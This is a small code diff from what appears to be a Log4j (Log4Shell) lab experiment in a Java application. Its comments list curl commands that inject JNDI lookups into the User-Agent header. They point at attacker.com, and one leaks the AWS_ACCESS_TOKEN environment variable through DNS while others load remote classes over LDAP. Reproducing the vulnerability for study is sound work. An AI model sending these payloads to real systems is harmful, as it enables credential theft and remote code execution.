@@ -36,5 +36,5 @@ public class Experiment04Application {
 // curl localhost:8080 -H "User-Agent: \${jndi:dns://attacker.com/hello-tln}"
 // curl localhost:8080 -H "User-Agent: \${jndi:dns://attacker.com/aws-token.\${env:AWS_ACCESS_TOKEN}.exploit.com}"
 
-// curl localhost:8080 -H "User-Agent: \${jndi:ldap://attacker.com:389/Calculator}"
 // curl localhost:8080 -H "User-Agent: \${jndi:ldap://attacker.com:389/YouTube}"
+// curl localhost:8080 -H "User-Agent: \${jndi:ldap://attacker.com:389/Calculator}"
